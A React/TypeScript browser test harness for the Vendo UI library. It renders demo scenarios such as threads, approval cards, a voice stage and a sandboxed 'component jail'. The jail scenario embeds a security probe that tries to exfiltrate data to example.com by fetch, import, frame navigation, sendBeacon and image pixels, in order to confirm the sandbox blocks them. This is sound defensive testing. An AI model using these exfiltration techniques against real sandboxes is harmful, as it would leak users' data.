import type {
  ApprovalDecision,
  ApprovalRequest,
  Json,
  ToolOutcome,
  Tree,
  VendoTheme,
} from "@vendoai/core";
import {
  VendoProvider,
  createVendoClient,
  themeCssVariables,
  useVendoTheme,
  type Thread,
  type VendoClient,
} from "../../src/index.js";
import {
  ActivityPanel,
  ApprovalCard,
  AutomationsPanel,
  NoPolicyNotice,
  VendoOverlay,
  VendoPage,
  VendoPalette,
  VendoStage,
  VendoThread,
  type VendoCommand,
} from "../../src/chrome/index.js";
import { AppFrame, TreeView } from "../../src/tree/index.js";
import {
  realtimeVoiceDriver,
  type VoiceDriver,
  type VoiceDriverEvent,
  type VoiceDriverHandlers,
  type VoiceSessionHandle,
} from "../../src/voice/index.js";
import {
  useEffect,
  useMemo,
  useState,
  type ComponentType,
  type CSSProperties,
  type ReactNode,
} from "react";
import { createRoot } from "react-dom/client";
import "./styles.css";

const NOW = "2026-07-11T12:00:00.000Z";
const ok = async (): Promise<ToolOutcome> => ({ status: "ok", output: { accepted: true } });

const destructiveApproval: ApprovalRequest = {
  id: "apr_destructive",
  call: {
    id: "call_destructive",
    tool: "host_delete_invoice",
    args: { invoiceId: "inv_42", permanent: true },
  },
  descriptor: {
    name: "host_delete_invoice",
    description: "Permanently delete an invoice",
    inputSchema: { type: "object" },
    risk: "destructive",
    critical: true,
  },
  inputPreview: "invoiceId=inv_42\npermanent=true",
  ctx: {
    principal: { kind: "user", subject: "browser-user", display: "Browser User" },
    venue: "app",
    presence: "present",
    appId: "app_1",
  },
  createdAt: NOW,
};

const darkTheme: Partial<VendoTheme> = {
  colors: {
    background: "#111827",
    surface: "#1f2937",
    text: "#f9fafb",
    muted: "#d1d5db",
    accent: "#38bdf8",
    accentText: "#082f49",
    danger: "#fda4af",
    border: "#64748b",
  },
  typography: { fontFamily: "Inter, ui-sans-serif, system-ui, sans-serif", baseSize: "16px" },
  radius: { small: "4px", medium: "12px", large: "24px" },
  density: "comfortable",
  motion: "reduced",
};

const loudTheme: Partial<VendoTheme> = {
  colors: {
    background: "#fff7ed",
    surface: "#ffedd5",
    text: "#3b0764",
    muted: "#6b21a8",
    accent: "#7e22ce",
    accentText: "#ffffff",
    danger: "#b91c1c",
    border: "#f97316",
  },
  typography: {
    fontFamily: "Georgia, 'Times New Roman', serif",
    headingFamily: "Impact, Haettenschweiler, sans-serif",
    baseSize: "18px",
  },
  radius: { small: "2px", medium: "20px", large: "34px" },
  density: "comfortable",
  motion: "reduced",
};

const pendingThread: Thread = {
  id: "thr_1",
  subject: "browser-user",
  createdAt: NOW,
  updatedAt: NOW,
  messages: [{
    id: "msg_pending",
    role: "assistant",
    parts: [
      { type: "text", text: "I prepared the email and need your approval before sending." },
      {
        type: "dynamic-tool",
        toolName: "host_email_send",
        toolCallId: "call_pending",
        state: "approval-requested",
        input: { to: "finance@example.com", subject: "Invoice ready" },
        approval: { id: "apr_pending" },
      },
      {
        type: "data-vendo-approval",
        data: { toolCallId: "call_pending", risk: "write", approvalId: "apr_pending" },
      },
    ],
  }],
};

function threadClient(client: VendoClient): VendoClient {
  return {
    ...client,
    threads: {
      ...client.threads,
      get: async id => id === pendingThread.id ? pendingThread : client.threads.get(id),
    },
  };
}

function HostCard({ title, total, children }: { title?: string; total?: number; children?: ReactNode }) {
  return <article className="host-card"><strong>{title}</strong><div>Bound total: {total}</div>{children}</article>;
}

function Boom(): ReactNode {
  throw new Error("host render exploded inside its node boundary");
}

const components: Record<string, ComponentType> = {
  HostCard: HostCard as ComponentType,
  Boom,
};

const tree: Tree = {
  formatVersion: "vendo-genui/v1",
  root: "root",
  data: { customer: { name: "Ada Lovelace" }, invoice: { total: 4200 } },
  nodes: [
    { id: "root", component: "Stack", props: { gap: 14 }, children: ["heading", "host", "row", "bad", "survivor", "streaming"] },
    { id: "heading", component: "Text", props: { text: "Instant-path invoice", variant: "heading" } },
    {
      id: "host",
      component: "HostCard",
      source: "host",
      props: {
        title: { $path: "/customer/name" },
        total: { $path: "/invoice/total" },
      },
    },
    { id: "row", component: "Row", props: { gap: 10 }, children: ["caption", "divider"] },
    { id: "caption", component: "Text", props: { text: "Primitive sibling", variant: "caption" } },
    { id: "divider", component: "Divider" },
    { id: "bad", component: "Boom", source: "host" },
    { id: "survivor", component: "Text", props: { text: "Sibling survived" } },
    { id: "streaming", component: "Stack", children: ["not-yet-streamed"] },
  ],
};

const securitySource = String.raw`
import React, { useState } from "react";

export default function SecurityProbe({ label, onRun }) {
  const [fetchStatus, setFetchStatus] = useState("not run");
  const [importStatus, setImportStatus] = useState("not run");
  const [parentStatus, setParentStatus] = useState("not run");
  const [actionStatus, setActionStatus] = useState("not run");
  const [navigateStatus, setNavigateStatus] = useState("not run");
  const [beaconStatus, setBeaconStatus] = useState("not run");
  const [imageStatus, setImageStatus] = useState("not run");

  async function probeFetch() {
    try {
      await fetch("https://example.com/probe");
      setFetchStatus("UNEXPECTED SUCCESS");
    } catch {
      setFetchStatus("FAILURE (CSP)");
    }
  }

  async function probeImport() {
    try {
      await import("https://example.com/mod.js");
      setImportStatus("UNEXPECTED SUCCESS");
    } catch {
      setImportStatus("FAILURE (CSP)");
    }
  }

  function probeParent() {
    try {
      void parent.document.body;
      setParentStatus("UNEXPECTED SUCCESS");
    } catch {
      setParentStatus("FAILURE (opaque origin)");
    }
  }

  // Exfiltration by navigating the jail frame itself: governed by neither
  // connect-src nor img-src nor the sandbox's form/popup flags.
  function probeNavigate() {
    try {
      location.href = "https://example.com/nav-exfil?secret=" + encodeURIComponent(label);
      setNavigateStatus("navigation attempted");
    } catch {
      setNavigateStatus("FAILURE (blocked)");
    }
  }

  function probeBeacon() {
    try {
      const ok = navigator.sendBeacon("https://example.com/beacon", "secret");
      setBeaconStatus(ok ? "UNEXPECTED SUCCESS" : "FAILURE (CSP)");
    } catch {
      setBeaconStatus("FAILURE (CSP)");
    }
  }

  function probeImage() {
    const img = new Image();
    img.onload = () => setImageStatus("UNEXPECTED SUCCESS");
    img.onerror = () => setImageStatus("FAILURE (CSP)");
    img.src = "https://example.com/pixel.png?secret=1";
  }

  async function dispatch() {
    await onRun();
    setActionStatus("delivered");
  }

  return <section aria-label="Generated security probe">
    <h2>{label}</h2>
    <button type="button" onClick={probeFetch}>Probe fetch</button>
    <output id="fetch-status">fetch: {fetchStatus}</output>
    <button type="button" onClick={probeImport}>Probe import</button>
    <output id="import-status">import: {importStatus}</output>
    <button type="button" onClick={probeParent}>Probe parent DOM</button>
    <output id="parent-status">parent: {parentStatus}</output>
    <button type="button" onClick={dispatch}>Dispatch action</button>
    <output id="action-status">action: {actionStatus}</output>
    <button type="button" onClick={probeNavigate}>Probe navigate</button>
    <output id="navigate-status">navigate: {navigateStatus}</output>
    <button type="button" onClick={probeBeacon}>Probe beacon</button>
    <output id="beacon-status">beacon: {beaconStatus}</output>
    <button type="button" onClick={probeImage}>Probe image</button>
    <output id="image-status">image: {imageStatus}</output>
  </section>;
}
`;

const throwingSource = String.raw`
export default function ThrowingGeneratedComponent() {
  throw new Error("generated render exploded inside its jail");
}
`;

const jailTree: Tree = {
  formatVersion: "vendo-genui/v1",
  root: "root",
  nodes: [
    { id: "root", component: "Stack", children: ["before", "probe", "thrower", "after"] },
    { id: "before", component: "Text", props: { text: "Jail siblings before" } },
    {
      id: "probe",
      component: "SecurityProbe",
      source: "generated",
      props: {
        label: "Rendered generated props",
        onRun: { $action: "fn:secure-submit", payload: { invoiceId: "inv_42" } },
      },
    },
    { id: "thrower", component: "ThrowingGeneratedComponent", source: "generated" },
    { id: "after", component: "Text", props: { text: "Jail sibling survived" } },
  ],
  components: {
    SecurityProbe: securitySource,
    ThrowingGeneratedComponent: throwingSource,
  },
};

class ScriptedBrowserVoiceDriver implements VoiceDriver {
  start(handlers: VoiceDriverHandlers): VoiceSessionHandle {
    let active = true;
    const emit = (event: VoiceDriverEvent) => { if (active) handlers.onEvent(event); };
    queueMicrotask(() => {
      emit({ type: "state", state: "listening" });
      emit({ type: "transcript", entry: { id: "voice-user", role: "user", text: "Show revenue", final: true } });
      emit({ type: "transcript", entry: { id: "voice-assistant", role: "assistant", text: "Revenue is ready", final: true } });
    });
    return { stop: () => { active = false; } };
  }
}

function AutoOpen({ selector, children }: { selector: string; children: ReactNode }) {
  useEffect(() => {
    queueMicrotask(() => document.querySelector<HTMLElement>(selector)?.click());
  }, [selector]);
  return children;
}

function OpenPalette() {
  const [command, setCommand] = useState<VendoCommand>();
  const open = () => globalThis.dispatchEvent(new KeyboardEvent("keydown", { key: "k", ctrlKey: true, bubbles: true }));
  useEffect(() => {
    queueMicrotask(() => {
      document.querySelector<HTMLElement>("[data-testid=palette-opener]")?.focus();
      open();
    });
  }, []);
  return <><button type="button" data-testid="palette-opener" onClick={open}>Open command palette</button><VendoPalette onCommand={setCommand} /><output className="recorder" data-testid="command-recorder">{command ? JSON.stringify(command) : "No command selected"}</output></>;
}

function ApprovalScenario() {
  const [decision, setDecision] = useState<ApprovalDecision>();
  const decide = async (next: ApprovalDecision) => setDecision(next);
  return decision
    ? <output className="recorder" data-testid="approval-recorder">resolved: {JSON.stringify(decision)}</output>
    : <ApprovalCard approval={destructiveApproval} onDecide={decide} />;
}

function TreeThemeBoundary({ children }: { children: ReactNode }) {
  const theme = useVendoTheme();
  return <div className="tree-theme-boundary" style={themeCssVariables(theme) as CSSProperties}>{children}</div>;
}

function TreeScenario({ jail = false }: { jail?: boolean }) {
  const [action, setAction] = useState<{ nodeId: string; action: string; payload?: Json }>();
  const onAction = async (request: { nodeId: string; action: string; payload?: Json }): Promise<ToolOutcome> => {
    setAction(request);
    return { status: "ok", output: { recorded: true } };
  };
  return (
    <TreeThemeBoundary>
      <TreeView tree={jail ? jailTree : tree} components={components} onAction={onAction} />
      {jail ? <output className="recorder" data-testid="action-recorder">{action ? JSON.stringify(action) : "No action recorded"}</output> : null}
    </TreeThemeBoundary>
  );
}

function StageScenario() {
  const driver = useMemo(() => new ScriptedBrowserVoiceDriver(), []);
  return (
    <VendoProvider client={baseClient} voice={{ driver }}>
      <AutoOpen selector='button[aria-label="Start voice"], button'>
        <VendoStage />
      </AutoOpen>
    </VendoProvider>
  );
}

/** LIVE scenario (OPENAI_API_KEY-gated spec): the REAL realtime WebRTC driver.
 *  The ephemeral client secret arrives in the URL hash — the standing API key
 *  never reaches the browser, exactly as the driver's getSession() seam intends. */
function LiveStageScenario() {
  const driver = useMemo(() => {
    const clientSecret = decodeURIComponent(globalThis.location.hash.slice(1));
    return realtimeVoiceDriver({
      getSession: async () => ({ clientSecret }),
      instructions: "You are a terse test agent. Say 'ready' and wait.",
    });
  }, []);
  return (
    <VendoProvider client={baseClient} voice={{ driver }}>
      <VendoStage />
    </VendoProvider>
  );
}

function AppFrameScenario() {
  const cover = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='640' height='320'%3E%3Crect width='640' height='320' fill='%23ede9fe'/%3E%3Crect x='36' y='48' width='380' height='30' rx='8' fill='%238b5cf6'/%3E%3Crect x='36' y='106' width='550' height='18' rx='6' fill='%23c4b5fd'/%3E%3Crect x='36' y='145' width='490' height='18' rx='6' fill='%23ddd6fe'/%3E%3C/svg%3E";
  return (
    <div className="appframe-grid">
      <section aria-label="HTTP app frame same-origin"><h2>HTTP same-origin</h2><AppFrame surface={{ kind: "http", url: "/frame-target.html" }} /></section>
      <section aria-label="HTTP app frame cross-origin"><h2>HTTP cross-origin</h2><AppFrame surface={{ kind: "http", url: "https://app.example.com/machine" }} /></section>
      <section aria-label="Resuming app frame"><h2>Resuming</h2><AppFrame surface={{ kind: "resuming", cover }} /></section>
    </div>
  );
}

const baseClient = createVendoClient({ baseUrl: "/api/vendo" });
const unconfiguredClient = createVendoClient({ baseUrl: "/api/vendo", headers: { "x-vendo-force-posture": "unconfigured" } });

// A Maple-brand host theme (graphite accent, warm cream canvas) — the same
// brand the old shell adopted, so the landing reads like the real product.
const mapleTheme: Partial<VendoTheme> = {
  colors: {
    background: "#f3ede2", surface: "#fffdf9", text: "#14151a", muted: "#8a8b92",
    accent: "#1b1c22", accentText: "#ffffff", danger: "#b0392b", border: "rgba(20,21,26,.10)",
  },
  typography: { fontFamily: "Inter, ui-sans-serif, system-ui, sans-serif", baseSize: "15px" },
  radius: { small: "8px", medium: "12px", large: "20px" }, density: "comfortable", motion: "full",
};

/** A minimal Maple host shell (sidebar + top bar + Chat tab) so a Vendo surface
 *  renders in a realistic host context, matching the wave-2 shell's demos. */
function MapleFrame({ children }: { children: ReactNode }) {
  const navItem = (label: string, active = false) => (
    <div style={{ display: "flex", alignItems: "center", gap: 10, padding: "8px 10px", borderRadius: 8, fontSize: 14,
      color: active ? "#14151a" : "#5b5c63", background: active ? "rgba(20,21,26,.05)" : "transparent", fontWeight: active ? 600 : 500 }}>
      <span style={{ width: 16, height: 16, borderRadius: 4, background: "currentColor", opacity: .55 }} />{label}
    </div>
  );
  const topBtn = (label: string, dark = false) => (
    <button style={{ padding: "8px 14px", borderRadius: 10, fontSize: 13.5, fontWeight: 600, cursor: "pointer",
      border: dark ? "0" : "1px solid rgba(20,21,26,.12)", background: dark ? "#14151a" : "#fff", color: dark ? "#fff" : "#14151a" }}>{label}</button>
  );
  return (
    <div style={{ display: "grid", gridTemplateColumns: "216px 1fr", height: "100%", background: "#fff", color: "#14151a",
      fontFamily: "Inter, ui-sans-serif, system-ui, sans-serif" }}>
      <aside style={{ borderRight: "1px solid rgba(20,21,26,.08)", padding: "16px 14px", display: "flex", flexDirection: "column", gap: 4 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 9, padding: "4px 8px 16px", fontWeight: 700, fontSize: 18 }}>
          <span style={{ width: 26, height: 26, borderRadius: 8, background: "#14151a", color: "#fff", display: "grid", placeItems: "center", fontSize: 13 }}>◈</span>Maple
        </div>
        {navItem("Home")}{navItem("Accounts")}{navItem("Transactions")}{navItem("Cards")}{navItem("Payments")}{navItem("Insights")}{navItem("Ask Maple", true)}
        <div style={{ marginTop: "auto", display: "flex", flexDirection: "column", gap: 4 }}>{navItem("Activity")}{navItem("Settings")}</div>
      </aside>
      <div style={{ display: "flex", flexDirection: "column", minWidth: 0 }}>
        <header style={{ display: "flex", alignItems: "center", gap: 14, padding: "12px 22px", borderBottom: "1px solid rgba(20,21,26,.08)" }}>
          <strong style={{ fontSize: 16 }}>Ask Maple</strong>
          <div style={{ flex: 1, maxWidth: 320, display: "flex", alignItems: "center", gap: 8, padding: "7px 12px", borderRadius: 10, border: "1px solid rgba(20,21,26,.12)", color: "#8a8b92", fontSize: 13 }}>Search…<span style={{ marginLeft: "auto", fontSize: 11, border: "1px solid rgba(20,21,26,.12)", borderRadius: 5, padding: "1px 5px" }}>⌘K</span></div>
          <div style={{ marginLeft: "auto", display: "flex", gap: 8 }}>{topBtn("Send", true)}{topBtn("Request")}{topBtn("Move money")}</div>
        </header>
        <div style={{ padding: "0 22px", borderBottom: "1px solid rgba(20,21,26,.08)", display: "flex", gap: 16, fontSize: 13.5 }}>
          <span style={{ padding: "12px 2px", borderBottom: "2px solid #14151a", fontWeight: 600 }}>Chat</span>
          <span style={{ padding: "12px 2px", color: "#8a8b92" }}>+</span>
        </div>
        <div style={{ flex: 1, minHeight: 0 }}>{children}</div>
      </div>
    </div>
  );
}

const MAPLE_SUGGESTIONS = [
  "What did I spend money on when I should've been asleep?",
  "What was that $87 DoorDash charge?",
  "Put me on blast in Slack when I order late-night delivery",
];

function LandingScenario() {
  return (
    <VendoProvider client={baseClient} components={components} theme={mapleTheme}>
      <MapleFrame>
        <VendoThread greeting="What do you want to build?" suggestions={MAPLE_SUGGESTIONS} onVoice={() => undefined} />
      </MapleFrame>
    </VendoProvider>
  );
}

function scenario(pathname: string): { title: string; theme?: Partial<VendoTheme>; content: ReactNode; ownProvider?: boolean } {
  switch (pathname) {
    case "/thread": return { title: "Thread — dark theme", theme: darkTheme, content: <VendoThread threadId="thr_1" /> };
    case "/thread-landing": return { title: "Landing (Maple host)", content: <LandingScenario />, ownProvider: true };
    case "/overlay": return { title: "Overlay", content: <AutoOpen selector='button[aria-controls="vendo-overlay-dialog"]'><VendoOverlay /></AutoOpen> };
    case "/page": return { title: "Workspace — Apps tab", content: <AutoOpen selector='[role="tab"][aria-controls="vendo-panel-apps"]'><VendoPage /></AutoOpen> };
    case "/palette": return { title: "Command palette", content: <OpenPalette /> };
    case "/approval": return { title: "Destructive approval", content: <ApprovalScenario /> };
    case "/activity": return { title: "Activity", content: <ActivityPanel /> };
    case "/automations": return { title: "Automations", content: <AutomationsPanel /> };
    case "/notice": return { title: "Unconfigured policy", ownProvider: true, content: (<VendoProvider client={unconfiguredClient} components={components}><NoPolicyNotice /></VendoProvider>) };
    case "/stage": return { title: "Voice stage", content: <StageScenario />, ownProvider: true };
    case "/stage-live": return { title: "Voice stage (live)", content: <LiveStageScenario />, ownProvider: true };
    case "/tree": return { title: "Tree containment", content: <TreeScenario /> };
    case "/tree-jail": return { title: "Generated component jail", content: <TreeScenario jail /> };
    case "/tree-themed": return { title: "Tree — loud host theme", theme: loudTheme, content: <TreeScenario /> };
    case "/appframe": return { title: "App execution planes", content: <AppFrameScenario /> };
    default: return { title: "Unknown scenario", content: <p role="alert">Unknown browser scenario: {pathname}</p> };
  }
}

function Harness() {
  const current = scenario(globalThis.location.pathname);
  const content = current.ownProvider
    ? current.content
    : (
      <VendoProvider
        client={globalThis.location.pathname === "/thread" ? threadClient(baseClient) : baseClient}
        components={components}
        theme={current.theme}
      >
        {current.content}
      </VendoProvider>
    );
  // Full-bleed host-frame scenarios (the Maple frame IS the host chrome) render
  // edge-to-edge, not as a card on the harness canvas.
  if (globalThis.location.pathname === "/thread-landing") {
    return <div data-scenario="thread-landing" style={{ position: "fixed", inset: 0 }}>{content}</div>;
  }
  return (
    <main className={`harness-shell${globalThis.location.pathname === "/thread" ? " harness-dark" : ""}`} data-scenario={globalThis.location.pathname.slice(1)}>
      <h1 className="harness-heading">{current.title}</h1>
      <div className="harness-surface">{content}</div>
    </main>
  );
}

const root = document.getElementById("root");
if (!root) throw new Error("Browser harness root is missing.");
createRoot(root).render(<Harness />);
